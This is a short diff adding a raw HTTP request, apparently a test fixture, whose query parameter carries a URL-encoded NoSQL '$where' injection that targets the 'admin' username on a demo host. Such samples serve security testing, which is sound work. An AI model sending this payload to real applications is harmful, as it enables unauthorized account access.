@@ -1,0 +1,4 @@
+GET /a?data=$where%0athis.username%3D%3D'admin' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
